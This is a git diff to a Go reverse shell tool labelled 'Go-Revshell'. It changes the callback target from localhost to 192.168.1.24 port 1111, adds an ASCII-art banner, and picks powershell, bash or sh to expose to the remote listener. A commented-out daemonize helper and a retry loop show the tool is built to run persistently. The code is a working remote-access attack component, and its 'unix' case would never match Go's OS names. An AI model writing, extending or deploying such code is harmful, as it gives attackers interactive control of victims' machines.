@@ -10,12 +10,13 @@ import (
 	"strings"
 	"time"
 
+	"github.com/common-nighthawk/go-figure"
 	"github.com/takama/daemon"
 )
 
 func main() {
 	// daemonize()
-	connectToClient("localhost", 1111)
+	connectToClient("192.168.1.24", 1111)
 }
 
 func daemonize() {
@@ -31,11 +32,14 @@ func connectToClient(host string, port int) {
 		if err != nil {
 			time.Sleep(2 * time.Second)
 		} else {
-			connexion.Write([]byte("[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
+			connexion.Write([]byte(figure.NewFigure("Go-Revshell", "", true).String() + "\n[+] Connected to server.\nType \"quit\" to close the shell properly or the process will die server side.\n"))
 			var shell string
-			if runtime.GOOS == "windows" {
+			switch runtime.GOOS {
+			case "windows":
 				shell = "powershell.exe"
-			} else {
+			case "unix":
+				shell = "/bin/bash"
+			default:
 				shell = "/bin/sh"
 			}
 			reverseShell(connexion, shell)
